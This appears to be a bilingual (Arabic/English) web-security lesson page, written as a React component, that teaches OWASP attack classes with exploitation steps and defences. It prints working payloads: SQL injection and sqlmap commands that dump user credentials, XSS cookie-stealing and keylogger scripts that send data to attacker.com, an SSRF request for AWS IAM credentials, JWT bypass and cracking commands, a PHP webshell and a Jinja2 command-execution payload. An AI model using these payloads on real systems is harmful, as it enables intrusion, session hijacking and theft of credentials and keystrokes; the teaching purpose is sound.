"use client";
import { LessonShell, Section, Callout, Code, Step, Terminal, Analogy, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="web-attacks">
      <L
        ar={<>
          <Section title="OWASP Top 10 — خريطة ثغرات الويب">
            <p>إنت بتختبر تطبيق ويب. تبدأ منين؟</p>
            <p>تجرّب كل payload في PayloadsAllTheThings؟</p>
            <p>هتقعد سنة. وهتلاقي حاجة بالصدفة، لو ربنا كرّم.</p>
            <Analogy>
              90% من اختراقات الويب بترجع لـ 10 عائلات بس. مش 1000.
              لو حفظت العائلات دي بفلسفتها — بتشتغل ازاي، بتتلقط ازاي، بتتقفل ازاي — هتلاقي بقية الـ payloads بنفسك.
              متحفظش payloads. افهم ليه الـ payload شغّال أصلاً.
            </Analogy>
            <Callout kind="info" title="القصة الكلاسيكية: TalkTalk 2015">
              SQL injection بسيطة على page عمرها 10 سنين. سرقت بيانات 4 مليون عميل، وغرّمت الشركة 400 ألف جنيه إسترليني.
              الـ payload؟ <code>{`' OR 1=1 --`}</code>. هو هو من 1998.
              يعني فيه ثغرات عمرها 25 سنة لسه بتاكل شركات في 2024.
              ليه؟ لأن "Prepared Statements" كلام بنقوله، مش بنعمله.
            </Callout>
          </Section>
          <Section id="sqli" title="1. SQL Injection — حقن قواعد البيانات">
            <Analogy>تخيل إنك بتقول للجرسون: &quot;هاتلي طبق اسمه <i>كباب</i>&quot;. يجيبه. بس لو قلتله: &quot;<i>كباب، وكمان افتح الخزنة</i>&quot;، والجرسون ده غبي بينفذ كل اللي بتقوله حرفياً، هتلاقي الكباب والفلوس على الترابيزة.

            - طب يعني الـ DB غبية كده يا حضرتك؟؟

            ها ها ها يا مستجد.. الـ DB مش غبية، الـ developer هو اللي مش فاصل بين "بيانات" و"أوامر". الـ DB بتنفذ اللي يوصلها. وأنت بتبعتلها string فيها أمر — هتعمل ايه يعني؟</Analogy>
            <h3>الكود الضعيف</h3>
            <Code lang="PHP — vulnerable">{`$id = $_GET['id'];
$q  = "SELECT * FROM users WHERE id = $id";
// المستخدم يرسل: ?id=1 OR 1=1 --
// النتيجة: كل المستخدمين`}</Code>
            <h3>الاستغلال خطوة بخطوة</h3>
            <Step n={1} title="اكتشاف الحقن">حط علامة اقتباس ' في كل parameter وشوف لو الـ app كسرت ورجّعت error. لو كسرت = فيه سكة.</Step>
            <Step n={2} title="تحديد عدد الأعمدة">
              <Code lang="payload">{`?id=1 ORDER BY 1--+
?id=1 ORDER BY 5--+   ← خطأ يعني الجدول فيه 4 أعمدة`}</Code>
            </Step>
            <Step n={3} title="استخراج البيانات بـ UNION">
              <Code lang="payload">{`?id=-1 UNION SELECT 1,user(),version(),database()--+
?id=-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables--+
?id=-1 UNION SELECT 1,group_concat(username,':',password),3,4 FROM users--+`}</Code>
            </Step>
            <Step n={4} title="الأتمتة بـ sqlmap">
              <Terminal lines={[
                { p: "sqlmap -u 'https://target.gov/p?id=1' --batch --dbs" },
                { p: "sqlmap -u 'https://target.gov/p?id=1' -D appdb --tables" },
                { p: "sqlmap -u 'https://target.gov/p?id=1' -D appdb -T users --dump" },
              ]} />
            </Step>
            <Callout kind="good" title="اللي بيشتغل فعلاً">
              <ol>
                <li><b>Prepared Statements</b> دايماً — مفيش concatenation خالص. ولا مرة. اوعى.</li>
                <li>ORM محترم بـ parameterized queries.</li>
                <li>صلاحيات قاعدة البيانات محدودة (least privilege) — حساب الويب مش لازم يكون root.</li>
                <li>WAF + قواعد Sigma بتمسك بصمات sqlmap من بدري.</li>
              </ol>
            </Callout>
          </Section>
          <Section id="xss" title="2. Cross-Site Scripting (XSS)">
<Analogy>تخيل إنك بعت تعليق في صفحة، والموقع بيعرضه زي ما هو من غير ما ينضّفه. لو كتبت كود جوه التعليق، الكود ده هيشتغل على متصفح كل واحد بيقرا الصفحة. التعليق بقى سلاح.</Analogy>
            <h3>أنواعها</h3>
            <ul>
              <li><b>Reflected XSS</b> — بترتد من اللينك على طول.</li>
              <li><b>Stored XSS</b> — بتتخزّن في قاعدة البيانات. الأخطر.</li>
              <li><b>DOM-based XSS</b> — كلها في الـ JavaScript على المتصفح، السيرفر مش شايف حاجة.</li>
            </ul>
            <Code lang="payloads">{`<script>fetch('https://attacker.com/c?d='+document.cookie)</script>
"><img src=x onerror=alert(1)>
javascript:alert(document.domain)
<svg/onload=eval(atob('YWxlcnQoMSk='))>`}</Code>
            <h3>سرقة الجلسة كاملة</h3>
            <Code lang="JS — keylogger via stored XSS">{`(function(){
  let buf="";
  document.addEventListener('keydown', e => {
    buf += e.key;
    if(buf.length>40){
      navigator.sendBeacon('https://attacker.com/k', buf);
      buf="";
    }
  });
})();`}</Code>
            <Callout kind="good" title="الحماية">Output encoding حسب الـ context (HTML غير JS غير URL) + CSP صارم (script-src 'self') + HttpOnly + Secure + SameSite على الكوكيز. CSP لوحده بيقفل 80% من اللعبة.</Callout>
          </Section>
          <Section id="ssrf" title="3. SSRF — Server-Side Request Forgery">
<Analogy>إنت بتطلب من السيرفر إنه يفتحلك لينك بدالك. لو ما تأكدش من اللينك، تخليه يفتح عناوين <b>داخلية</b> إنت مش هتقدر توصلها بنفسك — زي localhost أو الـ cloud metadata. السيرفر بقى بوّاب لطلباتك.</Analogy>
            <h3>سيناريو خطير على AWS</h3>
            <Code lang="payload">{`# الموقع يقبل URL لتحميل صورة
POST /api/import-image  body: {"url":"http://example.com/x.png"}

# المهاجم يبدّلها بـ:
{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role"}

# النتيجة: مفاتيح AWS مؤقتة كاملة!`}</Code>
            <Callout kind="good" title="الحماية">
              <ul>
                <li>فرض IMDSv2 دايماً (محتاج PUT token). IMDSv1 خرم مفتوح.</li>
                <li>Egress allow-list من السيرفر — مش كل الدنيا مفتوحة على بعضها.</li>
                <li>قفل IPs الخاصة (10.0.0.0/8, 169.254.0.0/16, ::1).</li>
                <li>VPC endpoints بدل الإنترنت في كل مكان ينفع.</li>
              </ul>
            </Callout>
          </Section>
          <Section id="auth" title="4. كسر الـ Authentication و JWT">
            <h3>هجمات بنشوفها كل يوم</h3>
            <ul>
              <li><b>Credential stuffing</b> — تجربة باسوردات اتسربت قبل كده على نفس الإيميلات.</li>
              <li><b>Password spraying</b> — باسورد واحد شائع على آلاف الحسابات.</li>
              <li><b>كسر JWT</b> — تغيير الـ algorithm لـ none، أو كسر الـ secret بـ hashcat.</li>
            </ul>
            <Code lang="JWT attacks">{`# 1) alg:none bypass
{"alg":"none","typ":"JWT"}.{"user":"admin"}.

# 2) brute force HS256 secret
hashcat -m 16500 jwt.txt rockyou.txt

# 3) algorithm confusion RS256 → HS256`}</Code>
          </Section>
          <Section id="idor" title="5. IDOR — Insecure Direct Object Reference">
            <p>تغيّر رقم واحد في الـ URL فتلاقي بيانات شخص تاني قدامك. أبسط ثغرة في الويب وأكترها انتشاراً.</p>
            <Code lang="HTTP">{`GET /api/invoices/1042  ← فاتورتك
GET /api/invoices/1043  ← فاتورة شخص آخر! (لا يوجد فحص ملكية)`}</Code>
            <Callout kind="good" title="الحماية">في كل request اسأل سؤال واحد: &quot;هل المستخدم الحالي يملك الـ resource ده فعلاً؟&quot;. ولو الإجابة لأ، ارفض. واستخدم UUIDv4 بدل أرقام تسلسلية — مش الأمن لكن بيصعّب التخمين.</Callout>
          </Section>
          <Section id="upload" title="6. File Upload + RCE">
            <p>ترفع ملف .php أو .jsp متخفّي (shell.php.jpg) في مجلد بينفذ كود = اختراق كامل للسيرفر. قصة قديمة لسه شغالة.</p>
            <Code lang="PHP webshell minimal">{`<?php system($_GET['c']); ?>`}</Code>
            <Callout kind="good" title="الحماية">اتأكد من الـ Content-Type + التوقيع الفعلي للملف (magic bytes) + خزّن خارج مسار الويب + قدّم الملفات عن طريق CDN بس. مش extension validation لوحده — ده بياكلوه بسكوت.</Callout>
          </Section>
          <Section id="deser" title="7. Deserialization & Template Injection">
            <p>الفئة دي هي الأخطر على الإطلاق: تنفيذ كود مباشر لما الـ payload المصنوع يوصل لـ unserialize أو pickle.loads أو Java readObject، أو لمحرك قوالب بيقبل تعبيرات (Jinja2, Twig, Freemarker). لو مسكت واحدة منها = RCE فوري.</p>
            <Code lang="SSTI Jinja2">{`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`}</Code>
          </Section>
          <Section title="الأدوات الأساسية للويب">
            <ul>
              <li><b>Burp Suite</b> — الـ proxy اللي هتعتمد عليه يومياً.</li>
              <li><b>OWASP ZAP</b> — البديل المفتوح المصدر.</li>
              <li><b>Caido</b> — خفيف وحديث، شغل لطيف.</li>
              <li><b>sqlmap, wpscan, ffuf, gobuster, dalfox, kxss, gau, waybackurls</b>.</li>
            </ul>
          </Section>

          <Section title="غلطات الـ junior في اختبار الويب">
            <Callout kind="danger" title="اللي بيحصل لما الـ junior يبدأ">
              <ul>
                <li><b>يبتدي بـ sqlmap على كل parameter</b> — يقطع الـ DB في 5 دقايق، الـ ops تتعبه يطلع برّه. الـ stealth أهم من السرعة.</li>
                <li><b>يفرح بـ XSS reflected</b> — يكتبها Critical في التقرير. يا نجم، الـ XSS من غير context = noise. اللي مهم: stored XSS في admin panel، ولا session theft فعلية.</li>
                <li><b>يجرّب payloads عمياني</b> — بدل ما يفهم الـ stack. لو الـ backend Node، ما تجرّبش PHP payloads. لو Python، ما تجرّبش .NET deserialization.</li>
                <li><b>ينسى الـ business logic</b> — الـ IDOR والـ price tampering والـ race conditions. أكبر breaches اتعملت من business logic، مش من sqlmap.</li>
                <li><b>ما يقراش الـ JS</b> — كل API endpoints، كل secrets، كل feature flags جوه bundle.js. لو ما قريتوش، إنت بتلعب على نص الخريطة.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="الخلاصة الناشفة">
            <p>الويب مش 1000 ثغرة — الويب 10 عائلات.</p>
            <p>الـ Prepared Statements بتقفل SQLi.</p>
            <p>الـ CSP الصارم بيقفل XSS.</p>
            <p>الـ ownership check في كل request بيقفل IDOR.</p>
            <p>كله معروف من 20 سنة. السؤال: ليه لسه بيحصل؟</p>
            <p>لأن الـ engineers بيكتبوا code بسرعة، والـ security بيكتبوا تقارير بسرعة، ومحدش بيقعد يفهم الـ "ليه" من جذره.</p>
            <p>اكتبها على ظهر إيدك: الـ payload مش هو اللعبة — الـ "ليه الـ payload شغّال" هو اللعبة.</p>
          </Section>
        </>}
        en={<>
          <Section title="OWASP Top 10 — the map of web vulnerabilities">
            <p>More than 90% of web breaches fall into these families. We'll cover each: <b>how it's exploited, how to detect it, how to prevent it</b>.</p>
          </Section>
          <Section id="sqli" title="1. SQL Injection">
            <Analogy>Imagine you tell the waiter: "Bring me a dish called <i>kebab</i>." Done. But if you say "<i>kebab, and also open the safe</i>" and the waiter blindly follows every word, you'll get the kebab AND the cash. That's exactly what SQLi does.</Analogy>
            <h3>Vulnerable code</h3>
            <Code lang="PHP — vulnerable">{`$id = $_GET['id'];
$q  = "SELECT * FROM users WHERE id = $id";
// User sends: ?id=1 OR 1=1 --
// Result: every user returned`}</Code>
            <h3>Step-by-step exploitation</h3>
            <Step n={1} title="Detect injection">Add a single quote ' to every parameter and watch for errors.</Step>
            <Step n={2} title="Find column count">
              <Code lang="payload">{`?id=1 ORDER BY 1--+
?id=1 ORDER BY 5--+   ← error means table has 4 columns`}</Code>
            </Step>
            <Step n={3} title="Extract data via UNION">
              <Code lang="payload">{`?id=-1 UNION SELECT 1,user(),version(),database()--+
?id=-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables--+
?id=-1 UNION SELECT 1,group_concat(username,':',password),3,4 FROM users--+`}</Code>
            </Step>
            <Step n={4} title="Automate with sqlmap">
              <Terminal lines={[
                { p: "sqlmap -u 'https://target.gov/p?id=1' --batch --dbs" },
                { p: "sqlmap -u 'https://target.gov/p?id=1' -D appdb --tables" },
                { p: "sqlmap -u 'https://target.gov/p?id=1' -D appdb -T users --dump" },
              ]} />
            </Step>
            <Callout kind="good" title="Defense">
              <ol>
                <li><b>Prepared Statements</b> always — never concatenation.</li>
                <li>A safe ORM with parameterized queries.</li>
                <li>Restricted DB privileges (least privilege).</li>
                <li>WAF + Sigma rules to detect sqlmap signatures.</li>
              </ol>
            </Callout>
          </Section>
          <Section id="xss" title="2. Cross-Site Scripting (XSS)">
            <Analogy>You leave a comment and the site renders it raw. If you embed code in the comment, it executes in every reader's browser.</Analogy>
            <h3>Variants</h3>
            <ul>
              <li><b>Reflected XSS</b> — bounces back from a URL.</li>
              <li><b>Stored XSS</b> — saved in the database (most dangerous).</li>
              <li><b>DOM-based XSS</b> — entirely client-side in JavaScript.</li>
            </ul>
            <Code lang="payloads">{`<script>fetch('https://attacker.com/c?d='+document.cookie)</script>
"><img src=x onerror=alert(1)>
javascript:alert(document.domain)
<svg/onload=eval(atob('YWxlcnQoMSk='))>`}</Code>
            <h3>Full session theft</h3>
            <Code lang="JS — keylogger via stored XSS">{`(function(){
  let buf="";
  document.addEventListener('keydown', e => {
    buf += e.key;
    if(buf.length>40){
      navigator.sendBeacon('https://attacker.com/k', buf);
      buf="";
    }
  });
})();`}</Code>
            <Callout kind="good" title="Defense">Context-aware output encoding + a strict CSP (script-src 'self') + HttpOnly + Secure + SameSite cookies.</Callout>
          </Section>
          <Section id="ssrf" title="3. SSRF — Server-Side Request Forgery">
            <Analogy>You ask the server to fetch a URL on your behalf. If it doesn't validate the URL, you can ask it to fetch <b>internal</b> addresses you can't reach yourself, like localhost or cloud metadata.</Analogy>
            <h3>Dangerous AWS scenario</h3>
            <Code lang="payload">{`# Site accepts a URL to import an image
POST /api/import-image  body: {"url":"http://example.com/x.png"}

# Attacker swaps it for:
{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role"}

# Result: full temporary AWS credentials!`}</Code>
            <Callout kind="good" title="Defense">
              <ul>
                <li>Enforce IMDSv2 (requires PUT token).</li>
                <li>Egress allow-list from servers.</li>
                <li>Block private IP ranges (10.0.0.0/8, 169.254.0.0/16, ::1).</li>
                <li>Use VPC endpoints instead of internet egress.</li>
              </ul>
            </Callout>
          </Section>
          <Section id="auth" title="4. Broken authentication and JWT">
            <h3>Common attacks</h3>
            <ul>
              <li><b>Credential stuffing</b> — replaying leaked passwords.</li>
              <li><b>Password spraying</b> — one common password against thousands of accounts.</li>
              <li><b>JWT abuse</b> — switching alg to none, or cracking the secret with hashcat.</li>
            </ul>
            <Code lang="JWT attacks">{`# 1) alg:none bypass
{"alg":"none","typ":"JWT"}.{"user":"admin"}.

# 2) brute force HS256 secret
hashcat -m 16500 jwt.txt rockyou.txt

# 3) algorithm confusion RS256 → HS256`}</Code>
          </Section>
          <Section id="idor" title="5. IDOR — Insecure Direct Object Reference">
            <p>Change a number in the URL and you see someone else's data.</p>
            <Code lang="HTTP">{`GET /api/invoices/1042  ← your invoice
GET /api/invoices/1043  ← someone else's! (no ownership check)`}</Code>
            <Callout kind="good" title="Defense">Validate ownership on every request: "Does the current user own this resource?" Use unguessable identifiers (UUIDv4).</Callout>
          </Section>
          <Section id="upload" title="6. File Upload → RCE">
            <p>Uploading a disguised .php or .jsp (shell.php.jpg) into an executable path = full server compromise.</p>
            <Code lang="PHP webshell minimal">{`<?php system($_GET['c']); ?>`}</Code>
            <Callout kind="good" title="Defense">Validate Content-Type + actual file signature + store outside the web path + serve files only via CDN.</Callout>
          </Section>
          <Section id="deser" title="7. Deserialization & Template Injection">
            <p>The most dangerous class: direct code execution when a crafted payload reaches unserialize / pickle.loads / Java readObject, or a templating engine that evaluates expressions (Jinja2, Twig, Freemarker).</p>
            <Code lang="SSTI Jinja2">{`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`}</Code>
          </Section>
          <Section title="Essential web tools">
            <ul>
              <li><b>Burp Suite</b> — your daily-driver proxy.</li>
              <li><b>OWASP ZAP</b> — open-source alternative.</li>
              <li><b>Caido</b> — lightweight and modern.</li>
              <li><b>sqlmap, wpscan, ffuf, gobuster, dalfox, kxss, gau, waybackurls</b>.</li>
            </ul>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
